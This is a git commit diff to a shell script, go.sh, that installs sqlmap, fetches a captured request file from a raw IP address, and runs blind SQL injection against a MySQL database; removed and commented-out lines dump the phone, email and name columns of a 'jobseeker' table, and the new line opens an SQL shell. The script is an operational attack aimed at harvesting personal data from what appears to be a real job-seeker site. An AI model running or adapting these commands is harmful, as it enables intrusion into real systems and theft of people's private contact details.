f14a4252888d892e27899db8f6017d78c1cfa372
xiutai <101174238+xiutai@users.noreply.github.com>
2022-12-13 23:16:21 +0800

    Update go.sh

--- go.sh
+++ go.sh
@@ -6,8 +6,7 @@ else
   git clone https://github.com/sqlmapproject/sqlmap.git
   wget http://20.24.186.53:7788/1.txt -O /root/sqlmap/1.txt
 fi
-echo "input start value:"
-read start
-echo "input stop value:"
-read stop
-python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
+
+python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --thread 10 --batch --sql-shell
+
+#python3 /root/sqlmap/sqlmap.py -r /root/sqlmap/1.txt --drop-set-cookie --technique B --level 5 --dbms mysql --batch -D walkin -T jobseeker -C "phone,email,name" --dump --skip-urlencode --thread 10  --start $start --stop $stop
